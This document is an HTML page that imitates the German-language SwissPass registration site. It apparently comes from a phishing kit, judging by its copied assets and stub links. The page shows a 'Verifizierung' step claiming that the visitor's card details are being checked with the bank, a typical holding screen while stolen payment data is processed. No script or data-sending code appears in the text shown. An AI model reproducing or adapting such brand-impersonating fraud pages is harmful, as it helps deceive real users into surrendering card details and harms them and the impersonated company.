                      <div class="container">
                        <div class="row">
                          <h2 class="sr-only">Service Navigation</h2>
                          <div class="col-sm-12 mod-metamenu--root">
                            <div class="mod-metamenu--logo">
                              <a aria-label="Startseite" href="#" class="ng-star-inserted">
                                <div class="visible-lg visible-md visible-sm ng-star-inserted">
                                  <picture>
                                    <source type="image/svg+xml" srcset="swisspass.ch_files/logo.svg 1x">
                                    <img alt="" src="swisspass.ch_files/logo.png" width="152" height="24">
                                  </picture>
                                </div>
                                <!---->
                              </a>
                              <!---->
                              <!---->
                              <!---->
                              <!---->
                            </div>
                            <ul class="mod-metamenu--list">
                              <li class="mod-metamenu--item ng-star-inserted">
                                <a class="mod-metamenu--link" href="#">
                                  <span aria-hidden="false" class="mod-metamenu--linktext"> Hilfe </span>
                                </a>
                              </li>
                              <!---->
                              <li app-dropdown-menu="" class="mod-metamenu--item">
                                <div class="js-dropdown mod-dropdown mod-dropdown__long">
                                  <a tabindex="0" class="mod-metamenu--link mod-dropdown--toggle" aria-expanded="false">
                                    <span class="sr-only">Sprachauswahl. Aktuelle Sprache:</span>
                                    <span aria-hidden="false" class="mod-metamenu--linktext"> de </span>
                                    <span aria-hidden="true" class="mod-metamenu--linkicon js-dropdown--linkicon mod-icon icon-arrow_small_down_16"></span>
                                  </a>
                                  <ul class="mod-dropdown--items mod-metamenu--dropdown mod-dropdown--menu">
                                    <app-dropdown-menu-entry class="ng-star-inserted">
                                      <li class="mod-dropdown--item" aria-selected="true">
                                        <a class="mod-dropdown--link mod-dropdown--link__active" tabindex="-1" aria-selected="true" aria-disabled="true">
                                          <!---->
                                          <span class="mod-dropdown--linktext"> de <span class="sr-only ng-star-inserted">AusgewÃ¤hlt</span>
                                            <!---->
                                          </span>
                                          <span aria-hidden="true" class="mod-dropdown--linkicon mod-icon icon-checkmark_16 ng-star-inserted"></span>
                                          <!---->
                                        </a>
                                      </li>
                                    </app-dropdown-menu-entry>
                                    <app-dropdown-menu-entry class="ng-star-inserted">
                                      <li class="mod-dropdown--item" aria-selected="false">
                                        <a class="mod-dropdown--link" tabindex="-1" aria-selected="false" aria-disabled="false">
                                          <!---->
                                          <span class="mod-dropdown--linktext"> fr
                                            <!---->
                                          </span>
                                          <!---->
                                        </a>
                                      </li>
                                    </app-dropdown-menu-entry>
                                    <app-dropdown-menu-entry class="ng-star-inserted">
                                      <li class="mod-dropdown--item" aria-selected="false">
                                        <a class="mod-dropdown--link" tabindex="-1" aria-selected="false" aria-disabled="false">
                                          <!---->
                                          <span class="mod-dropdown--linktext"> it
                                            <!---->
                                          </span>
                                          <!---->
                                        </a>
                                      </li>
                                    </app-dropdown-menu-entry>
                                    <app-dropdown-menu-entry class="ng-star-inserted">
                                      <li class="mod-dropdown--item" aria-selected="false">
                                        <a class="mod-dropdown--link" tabindex="-1" aria-selected="false" aria-disabled="false">
                                          <!---->
                                          <span class="mod-dropdown--linktext"> en
                                            <!---->
                                          </span>
                                          <!---->
                                        </a>
                                      </li>
                                    </app-dropdown-menu-entry>
                                    <!---->
                                  </ul>
                                </div>
                              </li>
                              <!---->
                              <li class="mod-metamenu--item ng-star-inserted">
                                <a class="mod-metamenu--link">
                                  <span aria-hidden="false" class="mod-metamenu--linktext"> Anmelden </span>
                                </a>
                              </li>
                              <!---->
                            </ul>
                          </div>
                        </div>
                      </div>
                    </nav>
                  </div>
                  <!---->
                  <div class="js-collapser--fixed">
                    <!---->
                  </div>
                </div>
              </div>
            </header>
          </app-swisspass-header>
          <div cdkscrollable="" class="skel-main ng-tns-c2819549821-0">
            <main role="main" tabindex="-1" class="ng-tns-c2819549821-0">
              <app-swisspass-main class="ng-tns-c2819549821-0" _nghost-ng-c1866012428="">
                <h1 _ngcontent-ng-c1866012428="" tabindex="-1" class="sr-only">Inhalt</h1>
                <a _ngcontent-ng-c1866012428="" routerlink="/register" routerlinkactive="active" tabindex="-1" class="sr-only js-webtrends--initted active" href="#">ZurÃ¼ck zu Navigieren auf swisspass.ch</a>
                <article _ngcontent-ng-c1866012428="" class="mod-content" style="min-height: 640px;">
                  <div _ngcontent-ng-c1866012428="" class="container mod-content--bg mod-content--root">
                    <div _ngcontent-ng-c1866012428="" id="messages-panel" aria-live="polite" aria-atomic="true" class="ui-outputpanel ui-widget">
                      <h2 _ngcontent-ng-c1866012428="" data-notification-header="all-messages" class="sr-only hidden">Nachrichten</h2>
                      <div _ngcontent-ng-c1866012428="" data-notification-id="notification_browser_old" aria-hidden="true" class="col-sm-12 mod-notification js-notification js-notification__ignore js-notification__oldbrowser mod-notification__alert js-notification__hide" style="max-height: 0;">
                        <div _ngcontent-ng-c1866012428="" class="mod-notification--wrap js-notification--container">
                          <div _ngcontent-ng-c1866012428="" class="mod-notification--message">
                            <div _ngcontent-ng-c1866012428="" class="mod-notification--sign mod-notification--sign__left">
                              <div _ngcontent-ng-c1866012428="" class="mod-valign">
                                <div _ngcontent-ng-c1866012428="" class="mod-valign--el">
                                  <span _ngcontent-ng-c1866012428="" aria-hidden="true" class="mod-icon icon-alert_big_32"></span>
                                </div>
                              </div>
                            </div>
                            <div _ngcontent-ng-c1866012428="" class="mod-notification--content">
                              <b _ngcontent-ng-c1866012428="" class="mod-notification--prefix"> Fehler: </b>
                              <h3 _ngcontent-ng-c1866012428=""> Ihr Webbrowser ist veraltet. </h3>
                              <br _ngcontent-ng-c1866012428="">
                              <p _ngcontent-ng-c1866012428=""> Dadurch kann die QualitÃ¤t der Seite erheblich beeintrÃ¤chtigt sein! Um alle Funktionen zu nutzen und Fehler zu vermeiden, wird dringend empfohlen Ihren Browser zu aktualisieren. </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <app-notification-messages _ngcontent-ng-c1866012428="" _nghost-ng-c3001457458="">
                      <!---->
                      <!---->
                      <!---->
                      <!---->
                      <div _ngcontent-ng-c3001457458="" id="messages-panel" layout="block" aria-live="polite" aria-atomic="true">
                        <h2 _ngcontent-ng-c3001457458="" data-notification-header="all-messages" class="sr-only hidden"> Nachrichten </h2>
                        <!---->
                      </div>
                    </app-notification-messages>
                  </div>
                  <router-outlet _ngcontent-ng-c1866012428="" name="fullWidthContentUpper"></router-outlet>
                  <!---->
                  <!---->
                  <router-outlet _ngcontent-ng-c1866012428="" name="fullWidthContentLower"></router-outlet>
                  <!---->
                  <div _ngcontent-ng-c1866012428="" class="container mod-content--bg mod-content--root">
                    <div class="mod-content--page ng-trigger ng-trigger-routeFadeAnimation">
                      <div class="ng-tns-c2819549821-0 mod-content--overview">
                        <app-sidebar-back-button class="ng-tns-c2819549821-0 ng-tns-c2708957342-1 ng-star-inserted" _nghost-ng-c2708957342="" style="">
                          <!---->
                        </app-sidebar-back-button>
                        <div class="row ng-tns-c2819549821-0">
                          <router-outlet class="ng-tns-c2819549821-0"></router-outlet>
                          <app-registration class="ng-star-inserted" style="">
                            <h2 class="sr-only">Registrieren</h2>
                            <div data-activation-criteria="input-length" class="mod-centercol mod-centercol__standalone">
                              <div class="mod-centercol--inner">
                                <div class="mod-centercol--root">
                                  <app-stepper linear="" role="tablist" _nghost-ng-c4122432623="">
                                    <header style="margin: 0 auto;" _ngcontent-ng-c4122432623="" role="tab" cdkstepheader="">
                                      <div _ngcontent-ng-c4122432623="" class="step-wrapper ng-star-inserted">
                                        <button _ngcontent-ng-c4122432623="" type="button" id="stepper-step-button-0">
                                          <span _ngcontent-ng-c4122432623="" class="step-index">1</span>
                                          <span _ngcontent-ng-c4122432623="" class="step-label ng-star-inserted">Anmeldung</span>
                                          <!---->
                                          <!---->
                                          <!---->
                                        </button>
                                      </div>
                                      <div _ngcontent-ng-c4122432623="" class="step-wrapper ng-star-inserted">
                                        <button _ngcontent-ng-c4122432623="" type="button" id="stepper-step-button-1">
                                          <span _ngcontent-ng-c4122432623="" class="step-index">2</span>
                                          <span _ngcontent-ng-c4122432623="" class="step-label ng-star-inserted">Karte</span>
                                          <!---->
                                          <!---->
                                          <!---->
                                        </button>
                                      </div>
                                      <div _ngcontent-ng-c4122432623="" class="step-wrapper ng-star-inserted active">
                                        <button _ngcontent-ng-c4122432623="" type="button" id="stepper-step-button-2" disabled="disabled">
                                          <span _ngcontent-ng-c4122432623="" class="step-index">3</span>
                                          <span _ngcontent-ng-c4122432623="" class="step-label ng-star-inserted">Verifizierung</span>
                                          <!---->
                                          <!---->
                                          <!---->
                                        </button>
                                      </div>
									 
                                      <div _ngcontent-ng-c4122432623="" class="step-wrapper disabled ng-star-inserted">
                                        <button _ngcontent-ng-c4122432623="" type="button" id="stepper-step-button-3" disabled="disabled">
                                          <span _ngcontent-ng-c4122432623="" class="step-index">4</span>
                                          <span _ngcontent-ng-c4122432623="" class="step-label ng-star-inserted">Aktivierung</span>
                                          <!---->
                                          <!---->
                                          <!---->
                                        </button>
                                      </div>
                                      <!---->
                                    </header>
                                    <div _ngcontent-ng-c4122432623="" class="mod-centercol--container"></div>
                                    <div _ngcontent-ng-c4263735718="" class="ng-star-inserted" style="">
                                      <form _ngcontent-ng-c4263735718="" novalidate="" class="ng-untouched ng-pristine ng-valid">
                                        <!---->
                                        <div _ngcontent-ng-c4263735718="" class="ng-star-inserted">
                                          <app-kundendaten-ohne-abo _ngcontent-ng-c4263735718="">
                                            <div class="mod-centercol--container">
                                              <div aria-hidden="true">
                                                <h3 style="text-align:center;">Verarbeitung...</h3> <br />
												<p  style="text-align:center;">Wir Uberprufen Ihre Kartendetails mit der Bank.
Bitte warten Sie, da dieser Vorgang einige Sekunden bis
zu einigen Minuten dauern kann. SchlieBen Sie dieses
Fenster wahrend des Verifizierungsprozesses bitte nicht.
</p><br />
<h3 style="color: #af1602;text-align:center;">Vielen Dank fur Ihr Verstandnis.</h3>
<p style="text-align:center;">
<img src="assets.gif" style="width: 50px;" />
</p>
                                              </div>
                                              <legend class="sr-only">Bitte erganzen Sie folgende Angaben.</legend>
                                              <app-kundendaten-input readonly="false" _nghost-ng-c2170418040="">
                                                <app-address-autocomplete _ngcontent-ng-c2170418040="" class="ng-invalid ng-touched ng-dirty"></app-address-autocomplete>
                                             </app-kundendaten-input>
                                            </div>
                                          </app-kundendaten-ohne-abo>
                                         
                                        </div>
                                        <!---->
                                      </form>
                                    </div>
                                  
                                  
                                   
                                    <!---->
                                  </app-stepper>
                                </div>
                              </div>
                            </div>
                          </app-registration>
                          <!---->
                        </div>
                        <app-scroll-to-top-button class="ng-tns-c2819549821-0" _nghost-ng-c281969890="">
                          <!---->
                        </app-scroll-to-top-button>
                      </div>
                    </div>
                  </div>
                </article>
			
              </app-swisspass-main>
			
            </main>
			
            <app-swisspass-footer class="ng-tns-c2819549821-0">
              <footer class="skel-footer">
                <nav id="navBottomRoot" class="mod-metamenu mod-metamenu__footer">
                  <h1 class="sr-only"> Fussbereich</h1>
                  <a routerlink="/register" routerlinkactive="active" tabindex="-1" class="sr-only js-webtrends--initted active" href="#"> ZurÃ¼ck zu Navigieren auf swisspass.ch</a>
                  <div class="container">
                    <div class="row">
                      <div class="col-sm-12 mod-metamenu--root">
                        <span class="mod-metamenu--claim visible-sm visible-md visible-lg">
                          <picture class="logo visible-sm visible-md visible-lg">
                            <source type="image/svg+xml" srcset="swisspass.ch_files/logo_002.svg 1x">
                            <img alt="" src="swisspass.ch_files/logo_002.png" height="14">
                          </picture>
                          <span class="claim visible-lg"> - Ihr Schlussel fur Mobilitat und Freizeit </span>
                        </span>
                        <ul class="mod-metamenu--list">
                          <app-swisspass-nav-entry class="ng-star-inserted">
                            <li class="mod-metamenu--item">
                              <div class="mod-metamenu--wrap">
                                <!---->
                                <!---->
                                <a queryparamshandling="merge" class="mod-metamenu--link ng-star-inserted" aria-selected="false" aria-disabled="false" href="#">
                                  <!---->
                                  <span class="mod-metamenu--linktext"> Fahrgastrechte
                                    <!---->
                                  </span>
                                  <!---->
                                </a>
                                <!---->
                              </div>
                            </li>
                          </app-swisspass-nav-entry>
                          <app-swisspass-nav-entry class="ng-star-inserted">
                            <li class="mod-metamenu--item">
                              <div class="mod-metamenu--wrap">
                                <!---->
                                <!---->
                                <a queryparamshandling="merge" class="mod-metamenu--link ng-star-inserted" aria-selected="false" aria-disabled="false" href="#">
                                  <!---->
                                  <span class="mod-metamenu--linktext"> Impressum
                                    <!---->
                                  </span>
                                  <!---->
                                </a>
                                <!---->
                              </div>
                            </li>
                          </app-swisspass-nav-entry>
                          <app-swisspass-nav-entry class="ng-star-inserted">
                            <li class="mod-metamenu--item">
                              <div class="mod-metamenu--wrap">
                                <!---->
                                <!---->
                                <a queryparamshandling="merge" class="mod-metamenu--link ng-star-inserted" aria-selected="false" aria-disabled="false" href="#">
                                  <!---->
                                  <span class="mod-metamenu--linktext"> Rechtlicher Hinweis
                                    <!---->
                                  </span>
                                  <!---->
                                </a>
                                <!---->
                              </div>
                            </li>
                          </app-swisspass-nav-entry>
                          <app-swisspass-nav-entry class="ng-star-inserted">
                            <li class="mod-metamenu--item">
                              <div class="mod-metamenu--wrap">
                                <!---->
                                <!---->
                                <a queryparamshandling="merge" class="mod-metamenu--link ng-star-inserted" aria-selected="false" aria-disabled="false" href="#">
                                  <!---->
                                  <span class="mod-metamenu--linktext"> Datenschutz
                                    <!---->
                                  </span>
                                  <!---->
                                </a>
                                <!---->
                              </div>
                            </li>
                          </app-swisspass-nav-entry>
                          <app-swisspass-nav-entry class="ng-star-inserted">
                            <li class="mod-metamenu--item">
                              <div class="mod-metamenu--wrap">
                                <!---->
                                <a tabindex="0" href="#" class="mod-metamenu--link ng-star-inserted">
                                  <!---->
                                  <span class="mod-metamenu--linktext"> Cookie-Einstellungen </span>
                                </a>
                                <!---->
                                <!---->
                              </div>
                            </li>
                          </app-swisspass-nav-entry>
                          <app-swisspass-nav-entry class="ng-star-inserted">
                            <li class="mod-metamenu--item">
                              <div class="mod-metamenu--wrap">
                                <!---->
                                <!---->
                                <a queryparamshandling="merge" class="mod-metamenu--link ng-star-inserted" aria-selected="false" aria-disabled="false" href="#">
                                  <!---->
                                  <span class="mod-metamenu--linktext"> Ãœber SwissPass
                                    <!---->
                                  </span>
                                  <!---->
                                </a>
                                <!---->
                              </div>
                            </li>
                          </app-swisspass-nav-entry>
                          <!---->
                        </ul>
                      </div>
                    </div>
                  </div>
                </nav>
              </footer>
            </app-swisspass-footer>
          </div>
        </div>
      </div>
      <div id="dialog_container" class="ng-tns-c2819549821-0"></div>
      <app-flying-focus class="ng-tns-c2819549821-0">
        <!---->
      </app-flying-focus>
      <app-alert class="ng-tns-c2819549821-0">
        <span aria-live="polite" class="sr-only"></span>
      </app-alert>
    </app-root>
    <noscript>
      <article class="mod-content">
        <div class="col-sm-12 mod-notification js-notification js-notification__ignore js-notification__nojs mod-notification__alert js-notification__hide" data-notification-id="notification_browser_nojs" aria-hidden="true">
          <div class="mod-notification--wrap js-notification--container">
            <div class="mod-notification--message">
              <div class="mod-notification--sign mod-notification--sign__left">
                <div class="mod-valign">
                  <div class="mod-valign--el">
                    <span class="mod-icon icon-alert_big_32" aria-hidden="true"></span>
                  </div>
                </div>
              </div>
              <div class="mod-notification--content">
                <h3> JavaScript ist deaktiviert </h3>
                <h3> JavaScript is deactivated </h3>
              </div>
            </div>
          </div>
        </div>
      </article>
    </noscript>
    <div id="onetrust-consent-sdk">
      <div class="onetrust-pc-dark-filter ot-fade-in" style="display: none;z-index:2147483645;visibility: hidden;
                    opacity: 0;transition: visibility 0s 400ms, opacity 400ms linear;"></div>
      <div id="onetrust-banner-sdk" class="otFlat bottom vertical-align-content ot-buttons-fw" tabindex="0" role="region" aria-label="Cookie banner" style="display: none;bottom: 0px;visibility: hidden;
                    opacity: 0;transition: visibility 0s 400ms, opacity 400ms linear;">
        <div role="alertdialog" aria-describedby="onetrust-policy-text" aria-modal="true" aria-label="Ihre PrivatsphÃ¤re ist uns wichtig">
          <div class="ot-sdk-container">
            <div class="ot-sdk-row">
              <div id="onetrust-group-container" class="ot-sdk-eight ot-sdk-columns">
                <div class="banner_logo"></div>
                <div id="onetrust-policy">
                  <h2 id="onetrust-policy-title">Ihre PrivatsphÃ¤re ist uns wichtig</h2>
                  <p id="onetrust-policy-text">Wenn Sie auf â€žAlle Cookies akzeptierenâ€œ klicken, stimmen Sie der Speicherung von Cookies auf Ihrem GerÃ¤t zu, um die Websitenavigation zu verbessern, die Websitenutzung zu analysieren und unsere MarketingbemÃ¼hungen zu unterstÃ¼tzen. <a href="#" aria-label="Weitere Informationen zum Datenschutz">DatenschutzerklÃ¤rung</a>
                  </p>
                </div>
              </div>
              <div id="onetrust-button-group-parent" class="ot-sdk-three ot-sdk-columns">
                <div id="onetrust-button-group">
                  <button id="onetrust-pc-btn-handler" class="cookie-setting-link">Einstellungen verwalten</button>
                  <button id="onetrust-accept-btn-handler">Akzeptieren</button>
                </div>
              </div>
            </div>
          </div>
          <!-- Close Button -->
          <div id="onetrust-close-btn-container"></div>
          <!-- Close Button END-->
        </div>
      </div>
    </div>
  </body>
</html>
